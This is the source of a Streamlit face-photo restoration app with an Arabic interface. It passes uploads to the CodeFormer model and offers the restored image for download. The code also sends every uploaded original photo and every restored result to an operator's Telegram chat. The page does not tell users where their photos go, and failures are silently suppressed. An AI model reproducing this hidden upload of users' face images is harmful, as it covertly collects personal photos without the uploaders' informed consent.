import streamlit as st
from gradio_client import Client, handle_file
import telebot
import os
from PIL import Image

# 1. إعدادات واجهة البرنامج
st.set_page_config(page_title="Aziz Ultra Vision", layout="centered")
st.title("🌟 Aziz Ultra Vision")
st.markdown("تحسين جودة الصور وترميم الوجوه بالذكاء الاصطناعي")

# 2. جلب مفاتيح التشغيل من الـ Secrets
try:
    TOKEN = st.secrets["TELEGRAM_TOKEN"]
    CHAT_ID = st.secrets["CHAT_ID"]
    bot = telebot.TeleBot(TOKEN)
except Exception as e:
    TOKEN = None
    bot = None
    st.warning("⚠️ تنبيه: لم يتم العثور على إعدادات التليجرام في السكريتس.")

# 3. قسم رفع الصور
uploaded_file = st.file_uploader("ارفع صورتك هنا...", type=["jpg", "jpeg", "png"])

if uploaded_file:
    image = Image.open(uploaded_file)
    st.image(image, caption="📸 الصورة الأصلية", use_container_width=True)
    
    if st.button("🚀 بدء الترميم والإرسال"):
        with st.spinner("جاري معالجة الصورة والحفاظ على الملامح..."):
            try:
                # حفظ الصورة مؤقتاً للمعالجة
                temp_input = "temp_input.png"
                image.save(temp_input)

                # --- (أ) إرسال الأصل للتليجرام ---
                if bot and CHAT_ID:
                    try:
                        with open(temp_input, "rb") as f_in:
                            bot.send_photo(CHAT_ID, f_in, caption="📸 صورة جديدة (قبل الترميم)")
                    except:
                        pass

                # --- (ب) استدعاء محرك الترميم مع ضبط دقة الألوان والملامح ---
                client = Client("sczhou/CodeFormer")
                result = client.predict(
                    image=handle_file(temp_input),
                    background_enhance=True,
                    face_upsample=True,
                    upscale=2,
                    codeformer_fidelity=0.7  # << هذا السطر يمنع تغيير لون العين والملامح
                )
                
                # استلام مسار الصورة الناتجة
                restored_path = result[0] if isinstance(result, (list, tuple)) else result
                
                # --- (ج) عرض النتيجة في الموقع وزر الحفظ ---
                st.image(restored_path, caption="✅ تم الترميم بنجاح", use_container_width=True)
                
                with open(restored_path, "rb") as file:
                    st.download_button(
                        label="📥 حفظ الصورة المرممة في جوالك",
                        data=file,
                        file_name="Aziz_Vision_Result.png",
                        mime="image/png"
                    )

                # --- (د) إرسال النتيجة النهائية للتليجرام ---
                if bot and CHAT_ID:
                    try:
                        with open(restored_path, "rb") as f_out:
                            bot.send_photo(CHAT_ID, f_out, caption="✨ النتيجة النهائية (بعد الترميم)")
                    except:
                        pass 
                
                # حذف الملف المؤقت بعد الانتهاء
                if os.path.exists(temp_input):
                    os.remove(temp_input)
                
            except Exception as e:
                st.error(f"حدث خطأ أثناء المعالجة: {e}")

# تذييل الصفحة
st.markdown("---")
st.caption("برمجة وتطوير عزيز | Aziz Ultra Vision Studio 2026")
